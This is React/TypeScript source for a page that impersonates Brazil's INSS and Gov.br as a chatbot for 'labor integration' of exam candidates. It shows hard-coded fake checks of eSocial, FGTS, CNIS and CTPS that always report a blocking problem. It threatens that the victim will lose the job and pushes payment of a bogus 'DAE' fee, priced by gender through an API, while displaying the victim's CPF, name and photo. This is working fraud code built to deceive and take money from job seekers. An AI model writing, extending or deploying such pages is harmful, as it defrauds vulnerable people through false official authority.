import { useEffect, useState, useRef } from 'react';
import { useLocation } from 'wouter';
import { ExercitoHeader } from '@/components/ExercitoHeader';
import { Bot, User, Loader2, FileText, ChevronRight } from 'lucide-react';
import logoMJ from '@assets/logo_INSS_1786320311202.png';
import { getExamDateFormatted } from '@/utils/examDate';

interface ChatMessage {
  id: string;
  type: 'bot' | 'user' | 'card';
  content: string;
  action?: {
    type: 'button' | 'confirm' | 'payment';
    label?: string;
    options?: string[];
    systemCheck?: string;
  };
  cardData?: UserInfo;
}

interface UserInfo {
  firstName: string;
  fullName: string;
  cpf: string;
  cidade: string;
  cargo: string;
  salario: string;
  localProva: string;
  dataProva: string;
  horarioProva: string;
  gender: string;
}

const getGenderedText = (gender: string, masculine: string, feminine: string) =>
  gender.toLowerCase().startsWith('f') ? feminine : masculine;

const CARGO_MAP: Record<string, string> = {
  'tecnico-administrativo': 'Técnico Administrativo',
  'tecnico-nivel-medio':    'Técnico de Nível Médio',
};

const SALARY_MAP: Record<string, string> = {
  'tecnico-administrativo': 'R$ 5.940,00',
  'tecnico-nivel-medio':    'R$ 8.216,00',
};

const LOADING_STEPS: Record<string, string[]> = {
  esocial: [
    'Conectando ao servidor do eSocial...',
    'Autenticando via Gov.br...',
    'Consultando qualificação cadastral...',
    'Validando CPF na base da Receita Federal...',
    'Verificando sincronização com INSS...',
    'Finalizando consulta...',
  ],
  fgts: [
    'Acessando FGTS Digital...',
    'Verificando vínculo PIS/PASEP...',
    'Consultando histórico de depósitos...',
    'Validando habilitação para empregador...',
    'Finalizando verificação...',
  ],
  cnis: [
    'Conectando à base Dataprev...',
    'Autenticando credenciais...',
    'Consultando vínculos anteriores...',
    'Verificando contribuições previdenciárias...',
    'Finalizando consulta...',
  ],
  ctps: [
    'Acessando CTPS Digital...',
    'Verificando dados cadastrais...',
    'Consultando registros de vínculos...',
    'Verificando liberação para novo registro...',
    'Finalizando verificação...',
  ],
};

const getVerificationResult = (system: string, firstName: string) => {
  switch (system) {
    case 'esocial':
      return {
        messages: [
          `${firstName}, a consulta ao eSocial identificou uma pendência no seu cadastro.`,
          'Divergência encontrada: a qualificação cadastral está incompleta. Seu CPF consta na base, mas a validação cruzada com a Receita Federal retornou status "pendente de atualização".',
          'Essa pendência impede o registro de admissão no sistema.',
        ],
      };
    case 'fgts':
      return {
        messages: [
          'Verificação do FGTS Digital concluída com sucesso.',
          `${firstName}, seu PIS/PASEP está vinculado corretamente e não há pendências neste sistema.`,
        ],
      };
    case 'cnis':
      return {
        messages: [
          'Consulta ao CNIS realizada com sucesso.',
          'Seus vínculos anteriores e contribuições previdenciárias estão corretamente registrados.',
        ],
      };
    case 'ctps':
      return {
        messages: [
          'A CTPS Digital está vinculada ao seu CPF.',
          'Porém, o registro de novo vínculo empregatício está bloqueado devido à pendência no eSocial identificada anteriormente.',
          `${firstName}, a regularização do eSocial é necessária para liberar a CTPS Digital para novo registro.`,
        ],
      };
    default:
      return { messages: ['Verificação concluída.'] };
  }
};

const generateChatFlow = (info: UserInfo) => {
  const genderedAprovado = getGenderedText(info.gender, 'aprovado', 'aprovada');

  return [
    {
      phase: 0,
      messages: [
        {
          id: 'p0-1',
          type: 'bot' as const,
          content: 'Bem-vindo ao Sistema de Integração Trabalhista do INSS — Instituto Nacional do Seguro Social.',
        },
        {
          id: 'p0-2',
          type: 'bot' as const,
          content: `${info.firstName ? `${info.firstName}, ` : ''}identificamos que você foi ${genderedAprovado} na etapa de pré-seleção do Concurso Público INSS 2026.`,
        },
        {
          id: 'p0-3',
          type: 'bot' as const,
          content: 'Este canal irá orientá-lo sobre o procedimento de Integração Trabalhista, etapa obrigatória para nomeação e posse no serviço público federal. Deseja prosseguir?',
          action: { type: 'confirm' as const, options: ['Sim, prosseguir', 'Mais informações'] },
        },
      ],
    },
    {
      phase: 1,
      messages: [
        {
          id: 'p1-1',
          type: 'bot' as const,
          content: 'O INSS está processando as nomeações do Concurso Público 2026, nos termos da legislação federal aplicável.',
        },
        {
          id: 'p1-2',
          type: 'bot' as const,
          content: `${info.cidade ? `Na região de ${info.cidade}, as` : 'As'} vagas exigem início imediato das atividades após a aprovação. Para isso, seus dados trabalhistas precisam estar previamente regularizados.`,
        },
        {
          id: 'p1-3',
          type: 'bot' as const,
          content: `Sem essa regularização, mesmo sendo ${genderedAprovado}, o sistema do governo não consegue efetivar sua posse. É um procedimento padrão para todos os candidatos aprovados no concurso.`,
          action: { type: 'confirm' as const, options: ['Entendi, continuar', 'Como funciona?'] },
        },
      ],
    },
    {
      phase: 2,
      messages: [
        {
          id: 'p2-1',
          type: 'bot' as const,
          content: 'Vou consultar sua situação no eSocial. Este é o sistema unificado do Governo Federal onde todas as informações trabalhistas são registradas.',
          action: { type: 'button' as const, label: 'Verificar eSocial', systemCheck: 'esocial' },
        },
      ],
    },
    {
      phase: 3,
      messages: [
        {
          id: 'p3-1',
          type: 'bot' as const,
          content: 'Agora vou verificar sua situação no FGTS Digital, sistema que controla os depósitos do seu futuro salário.',
          action: { type: 'button' as const, label: 'Verificar FGTS Digital', systemCheck: 'fgts' },
        },
      ],
    },
    {
      phase: 4,
      messages: [
        {
          id: 'p4-1',
          type: 'bot' as const,
          content: 'Consultando agora o CNIS (Cadastro Nacional de Informações Sociais), que registra seu histórico de contribuições.',
          action: { type: 'button' as const, label: 'Verificar CNIS', systemCheck: 'cnis' },
        },
      ],
    },
    {
      phase: 5,
      messages: [
        {
          id: 'p5-1',
          type: 'bot' as const,
          content: 'Por último, vou verificar sua CTPS Digital, onde o vínculo com o INSS será registrado.',
          action: { type: 'button' as const, label: 'Verificar CTPS Digital', systemCheck: 'ctps' },
        },
      ],
    },
    {
      phase: 6,
      messages: [
        {
          id: 'p6-1',
          type: 'bot' as const,
          content: `${info.firstName}, identificamos pendência no eSocial que está bloqueando sua CTPS Digital. Essa situação precisa ser resolvida antes da realização da prova.`,
        },
        {
          id: 'p6-2',
          type: 'bot' as const,
          content: 'O INSS exige que todos os sistemas trabalhistas estejam regularizados previamente à posse. Candidatos com pendências no eSocial no momento da nomeação não poderão ser empossados, mesmo sendo aprovados.',
        },
        {
          id: 'p6-3',
          type: 'bot' as const,
          content: 'Nesse caso, a vaga é automaticamente repassada para o próximo candidato da lista de classificação, nos termos da legislação federal aplicável ao concurso público.',
        },
        {
          id: 'p6-4',
          type: 'bot' as const,
          content: 'O INSS disponibiliza o DAE (Documento de Arrecadação do eSocial) para custear o processamento técnico da regularização. Essa contribuição cobre o trabalho da equipe do Núcleo de Integração eSocial.',
          action: { type: 'button' as const, label: 'Prosseguir para emissão' },
        },
      ],
    },
    {
      phase: 7,
      messages: [
        {
          id: 'p7-1',
          type: 'bot' as const,
          content: 'Sua guia DAE foi gerada. O valor corresponde à taxa de processamento técnico definida pelo INSS para regularização cadastral.',
        },
        {
          id: 'p7-2',
          type: 'bot' as const,
          content: 'Este é um pagamento único que cobre todo o processamento nos quatro sistemas federais. Após a confirmação, você receberá o comprovante de regularização por e-mail em até 2 horas.',
        },
        {
          id: 'p7-3',
          type: 'bot' as const,
          content: `${info.firstName ? `${info.firstName}, ` : ''}clique abaixo para gerar sua guia DAE e concluir a integração trabalhista.`,
          action: { type: 'payment' as const, label: 'Gerar Guia de Regularização' },
        },
      ],
    },
  ];
};

const GovBrBotIcon = ({ size = 'md' }: { size?: 'sm' | 'md' }) => {
  const iconSize = size === 'sm' ? 'w-4 h-4' : 'w-5 h-5';
  const containerSize = size === 'sm' ? 'w-8 h-8' : 'w-10 h-10';
  return (
    <div
      className={`${containerSize} rounded-full flex items-center justify-center flex-shrink-0 relative overflow-hidden`}
      style={{ background: 'linear-gradient(135deg, #0063AF 0%, #3D8BC7 50%, #FFCD07 100%)' }}
    >
      <Bot className={`${iconSize} text-white drop-shadow-sm`} />
    </div>
  );
};

export default function ESocialChatPage() {
  const [, navigate] = useLocation();
  const [messages, setMessages] = useState<ChatMessage[]>([]);
  const [currentMessageIndex, setCurrentMessageIndex] = useState(0);
  const [isTyping, setIsTyping] = useState(false);
  const [showAction, setShowAction] = useState(false);
  const [currentPhase, setCurrentPhase] = useState(0);
  const [isVerifying, setIsVerifying] = useState(false);
  const [verifyingSystem, setVerifyingSystem] = useState('');
  const [currentLoadingStep, setCurrentLoadingStep] = useState(0);
  const [fotoBase64, setFotoBase64] = useState<string | null>(null);
  const [daeValorFormatado, setDaeValorFormatado] = useState('R$ 68,92');
  const [userInfo, setUserInfo] = useState<UserInfo>({
    firstName: '', fullName: '', cpf: '', cidade: '',
    cargo: '', salario: '', localProva: '', dataProva: '',
    horarioProva: '', gender: 'M',
  });
  const [chatFlow, setChatFlow] = useState<ReturnType<typeof generateChatFlow>>([]);
  const messagesEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    window.scrollTo(0, 0);

    let parsedUser: any = null;
    let parsedCandidate: any = null;
    let applicationData: any = null;

    try { parsedUser = JSON.parse(localStorage.getItem('userData') || localStorage.getItem('userMedicalLogin') || 'null'); } catch (_) {}
    try {
      const raw = localStorage.getItem('candidateData');
      if (raw) { const d = JSON.parse(raw); parsedCandidate = d.candidate || d; }
    } catch (_) {}
    try { applicationData = JSON.parse(localStorage.getItem('applicationData') || 'null'); } catch (_) {}

    const fullName = parsedUser?.nomeCompleto || parsedUser?.name || parsedCandidate?.nomeCompleto || parsedCandidate?.fullName || '';
    const raw = fullName.split(' ')[0] || '';
    const firstName = raw ? raw.charAt(0).toUpperCase() + raw.slice(1).toLowerCase() : '';

    const cpf = parsedUser?.cpf || parsedCandidate?.cpf || '';
    const cidade =
      parsedUser?.cidade || parsedUser?.municipio ||
      parsedCandidate?.cidade || parsedCandidate?.municipio ||
      parsedCandidate?.protocoloFinal?.unidadeTrabalho?.regiao || '';

    const positionId = applicationData?.positionId || applicationData?.position_id || '';
    const cargo = CARGO_MAP[positionId] || parsedCandidate?.vagaSelecionada?.titulo || parsedCandidate?.cargo || parsedUser?.cargo || 'Técnico Administrativo';
    const salario = SALARY_MAP[positionId] || 'R$ 5.940,00';

    const localProva = applicationData?.examLocationName || parsedCandidate?.protocoloFinal?.localProva?.nome || '';
    const dataProva  = applicationData?.examDate  || parsedCandidate?.dataProva  || parsedCandidate?.examDate  || getExamDateFormatted();
    const horarioProva = applicationData?.examTime || parsedCandidate?.horarioProva || parsedCandidate?.examTime || '08:00';

    const gender = parsedUser?.gender || parsedUser?.genero || parsedUser?.sexo || parsedCandidate?.gender || parsedCandidate?.genero || 'M';

    // Fetch dynamic DAE value from API
    const fetchValor = async (genero: string) => {
      try {
        const gParam = genero.toLowerCase().startsWith('f') ? 'f' : 'm';
        const res = await fetch(`/api/valor-dinamico?tipo=esocial&genero=${gParam}`);
        const json = await res.json();
        if (json.success && json.valor) {
          const valor: number = json.valor;
          setDaeValorFormatado(`R$ ${valor.toFixed(2).replace('.', ',')}`);
          localStorage.setItem('daeValor', valor.toString());
        }
      } catch (_) {}
    };
    fetchValor(gender);

    const info: UserInfo = { firstName, fullName, cpf, cidade, cargo, salario, localProva, dataProva, horarioProva, gender };
    setUserInfo(info);
    setChatFlow(generateChatFlow(info));

    try {
      const fotoData = localStorage.getItem('foto');
      if (fotoData) {
        const foto = JSON.parse(fotoData);
        if (foto?.success && foto?.foto_base64) setFotoBase64(foto.foto_base64);
      }
    } catch (_) {}
  }, []);

  // Drive the chat message sequence
  useEffect(() => {
    if (chatFlow.length === 0) return;
    const phaseMessages = chatFlow[currentPhase]?.messages || [];
    if (currentMessageIndex >= phaseMessages.length) return;

    setIsTyping(true);
    setShowAction(false);

    const delay = Math.random() * 800 + 1200;
    const timer = setTimeout(() => {
      const msg = phaseMessages[currentMessageIndex];
      setMessages(prev => [...prev, msg]);
      setIsTyping(false);
      if (msg.action) {
        setTimeout(() => setShowAction(true), 400);
      } else {
        setTimeout(() => setCurrentMessageIndex(prev => prev + 1), 600);
      }
    }, delay);

    return () => clearTimeout(timer);
  }, [currentMessageIndex, currentPhase, chatFlow]);

  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages, isTyping]);

  const advancePhase = () => {
    setCurrentPhase(prev => prev + 1);
    setCurrentMessageIndex(0);
  };

  const handleSystemVerification = async (systemCheck: string, label: string) => {
    setMessages(prev => [...prev, { id: `u-${Date.now()}`, type: 'user', content: label }]);
    setShowAction(false);
    setIsVerifying(true);
    setVerifyingSystem(systemCheck);
    setCurrentLoadingStep(0);

    const steps = LOADING_STEPS[systemCheck] || ['Processando...'];
    for (let i = 0; i < steps.length; i++) {
      setCurrentLoadingStep(i);
      await new Promise(r => setTimeout(r, 800 + Math.random() * 700));
    }

    setIsVerifying(false);
    setVerifyingSystem('');
    setCurrentLoadingStep(0);

    const result = getVerificationResult(systemCheck, userInfo.firstName);
    for (let i = 0; i < result.messages.length; i++) {
      await new Promise(r => setTimeout(r, 800));
      setMessages(prev => [...prev, { id: `res-${systemCheck}-${i}-${Date.now()}`, type: 'bot', content: result.messages[i] }]);
    }

    await new Promise(r => setTimeout(r, 600));
    advancePhase();
  };

  const handleUserAction = async (response: string, systemCheck?: string) => {
    if (systemCheck) { await handleSystemVerification(systemCheck, response); return; }

    setMessages(prev => [...prev, { id: `u-${Date.now()}`, type: 'user', content: response }]);
    setShowAction(false);

    // Phase 1: show identity card after user responds
    if (currentPhase === 1) {
      setTimeout(() => {
        setMessages(prev => [...prev, { id: `card-${Date.now()}`, type: 'card', content: '', cardData: userInfo }]);
      }, 600);
    }

    setTimeout(advancePhase, 800);
  };

  const handlePayment = () => {
    setMessages(prev => [...prev, { id: `u-${Date.now()}`, type: 'user', content: 'Quero realizar o pagamento' }]);
    setTimeout(() => {
      window.scrollTo({ top: 0, behavior: 'smooth' });
      navigate('/e-social/pagamento');
    }, 800);
  };

  const formatCPF = (cpf: string) => {
    const c = cpf.replace(/\D/g, '');
    return c.length === 11 ? `${c.slice(0,3)}.${c.slice(3,6)}.${c.slice(6,9)}-${c.slice(9)}` : cpf;
  };

  const lastMessage = messages[messages.length - 1];

  return (
    <div className="min-h-screen flex flex-col bg-gray-50" style={{ fontFamily: "'Rawline','Open Sans',sans-serif" }}>
      <ExercitoHeader block_name={false} customTitle="Atendimento de Integração" customSubtitle="Integração Trabalhista — Servidores Públicos" />

      <div className="bg-[#0063AF] py-2 px-4 mt-0">
        <div className="max-w-xl mx-auto">
          <p className="text-white text-xs font-medium tracking-wide">Atendimento de Integração Trabalhista</p>
        </div>
      </div>

      <div className="flex-1 overflow-y-auto py-4">
        <div className="max-w-xl mx-auto px-4 space-y-4">

          {messages.map(message =>
            message.type === 'card' ? (
              <div key={message.id} className="animate-fade-in pl-10">
                <div className="bg-[#F8F9FA] border-l-4 border-[#0063AF] p-3 text-xs space-y-1">
                  <div className="flex items-center gap-1.5 text-[#0063AF] font-semibold text-[11px] uppercase tracking-wide mb-2">
                    <User className="w-3 h-3" />
                    Dados identificados
                  </div>
                  <div className="grid grid-cols-2 gap-x-4 gap-y-1 text-gray-700">
                    <span className="text-gray-500">Nome:</span>
                    <span className="font-medium truncate">{message.cardData?.fullName || 'Não informado'}</span>
                    <span className="text-gray-500">CPF:</span>
                    <span className="font-medium">{formatCPF(message.cardData?.cpf || '') || '---'}</span>
                    <span className="text-gray-500">Cargo:</span>
                    <span className="font-medium truncate">{message.cardData?.cargo}</span>
                    <span className="text-gray-500">Remuneração:</span>
                    <span className="font-medium text-green-700">{message.cardData?.salario}</span>
                  </div>
                  {(message.cardData?.localProva || message.cardData?.dataProva) && (
                    <div className="grid grid-cols-2 gap-x-4 gap-y-1 text-gray-700 pt-2 mt-2 border-t border-gray-200">
                      {message.cardData?.localProva && (
                        <>
                          <span className="text-gray-500">Local da prova:</span>
                          <span className="font-medium truncate">{message.cardData.localProva}</span>
                        </>
                      )}
                      {message.cardData?.dataProva && (
                        <>
                          <span className="text-gray-500">Data:</span>
                          <span className="font-medium text-red-700">{message.cardData.dataProva}</span>
                        </>
                      )}
                      {message.cardData?.horarioProva && (
                        <>
                          <span className="text-gray-500">Horário:</span>
                          <span className="font-medium">{message.cardData.horarioProva}</span>
                        </>
                      )}
                    </div>
                  )}
                </div>
              </div>
            ) : (
              <div
                key={message.id}
                className={`flex ${message.type === 'user' ? 'justify-end' : 'justify-start'} animate-fade-in`}
              >
                {message.type === 'bot' && (
                  <div className="mr-2 mt-1"><GovBrBotIcon size="sm" /></div>
                )}
                <div
                  className={`max-w-[85%] rounded-2xl px-4 py-3 ${
                    message.type === 'user'
                      ? 'bg-[#0063AF] text-white rounded-br-md'
                      : 'bg-white text-gray-800 rounded-bl-md shadow-sm border border-gray-100'
                  }`}
                >
                  <p className="text-sm leading-relaxed whitespace-pre-line">{message.content}</p>
                </div>
                {message.type === 'user' && (
                  <div className="w-8 h-8 rounded-full bg-gray-200 flex items-center justify-center ml-2 flex-shrink-0 overflow-hidden">
                    {fotoBase64
                      ? <img src={`data:image/jpeg;base64,${fotoBase64}`} alt="" className="w-full h-full object-cover" />
                      : <User className="w-4 h-4 text-gray-500" />}
                  </div>
                )}
              </div>
            )
          )}

          {/* System verification loading */}
          {isVerifying && (
            <div className="flex justify-start animate-fade-in">
              <div className="mr-2 mt-1"><GovBrBotIcon size="sm" /></div>
              <div className="bg-white rounded-2xl rounded-bl-md px-4 py-3 shadow-sm border border-gray-100 min-w-[220px]">
                <div className="flex items-center gap-2 mb-2">
                  <Loader2 className="w-4 h-4 text-[#0063AF] animate-spin" />
                  <span className="text-sm text-gray-700 font-medium">
                    {LOADING_STEPS[verifyingSystem]?.[currentLoadingStep] || 'Processando...'}
                  </span>
                </div>
                <div className="w-full bg-gray-200 rounded-full h-1">
                  <div
                    className="bg-[#0063AF] h-1 rounded-full transition-all duration-300"
                    style={{ width: `${((currentLoadingStep + 1) / (LOADING_STEPS[verifyingSystem]?.length || 1)) * 100}%` }}
                  />
                </div>
              </div>
            </div>
          )}

          {/* Typing indicator */}
          {isTyping && !isVerifying && (
            <div className="flex justify-start animate-fade-in">
              <div className="mr-2 mt-1"><GovBrBotIcon size="sm" /></div>
              <div className="bg-white rounded-2xl rounded-bl-md px-4 py-3 shadow-sm border border-gray-100">
                <div className="flex items-center gap-1">
                  <span className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: '0ms' }} />
                  <span className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: '150ms' }} />
                  <span className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: '300ms' }} />
                </div>
              </div>
            </div>
          )}

          {/* Action buttons */}
          {showAction && lastMessage?.action && (
            <div className="animate-fade-in pl-10">
              {lastMessage.action.type === 'confirm' && lastMessage.action.options && (
                <div className="flex flex-wrap gap-2">
                  {lastMessage.action.options.map((option, idx) => (
                    <button
                      key={idx}
                      onClick={() => handleUserAction(option)}
                      className="bg-white border border-[#0063AF] text-[#0063AF] rounded-full px-4 py-2 text-sm font-medium hover:bg-[#0063AF] hover:text-white transition-all duration-200"
                    >
                      {option}
                    </button>
                  ))}
                </div>
              )}

              {lastMessage.action.type === 'button' && (
                <button
                  onClick={() => handleUserAction(lastMessage.action?.label || 'Continuar', lastMessage.action?.systemCheck)}
                  className="bg-[#0063AF] text-white rounded-full px-5 py-2.5 text-sm font-medium hover:bg-[#004D8C] transition-all duration-200 flex items-center gap-2"
                >
                  {lastMessage.action.label}
                  <ChevronRight className="w-4 h-4" />
                </button>
              )}

              {lastMessage.action.type === 'payment' && (
                <div className="space-y-3">
                  <div className="bg-white rounded-lg border border-gray-200 p-3">
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center gap-2">
                        <FileText className="w-4 h-4 text-[#0063AF]" />
                        <span className="text-xs font-medium text-gray-700">DAE</span>
                      </div>
                      <span className="text-[10px] text-gray-400">CIT-2025</span>
                    </div>
                    <div className="text-xs text-gray-500 mb-2 truncate">
                      {userInfo.fullName || 'Candidato'} · {formatCPF(userInfo.cpf) || '---'}
                    </div>
                    <div className="flex justify-between items-center pt-2 border-t border-gray-100">
                      <span className="text-xs text-gray-500">Valor</span>
                      <span className="text-[#0063AF] font-semibold">{daeValorFormatado}</span>
                    </div>
                  </div>
                  <button
                    onClick={handlePayment}
                    className="w-full bg-[#0063AF] hover:bg-[#004D8C] text-white py-2.5 px-4 text-sm font-medium rounded-lg transition-colors"
                  >
                    Gerar Guia
                  </button>
                </div>
              )}
            </div>
          )}

          <div ref={messagesEndRef} />
        </div>
      </div>

      {/* Footer */}
      <div className="bg-white border-t border-gray-200 py-4 px-4">
        <div className="flex justify-center">
          <img src={logoMJ} alt="INSS — Instituto Nacional do Seguro Social" className="h-9 object-contain" />
        </div>
        <p className="text-center text-[#AAAAAA] text-[10px] mt-3">
          Portal do Candidato v3.6 · eSocial Federal
        </p>
      </div>

      <style>{`
        @keyframes fade-in {
          from { opacity: 0; transform: translateY(8px); }
          to   { opacity: 1; transform: translateY(0); }
        }
        .animate-fade-in { animation: fade-in 0.3s ease-out forwards; }
      `}</style>
    </div>
  );
}
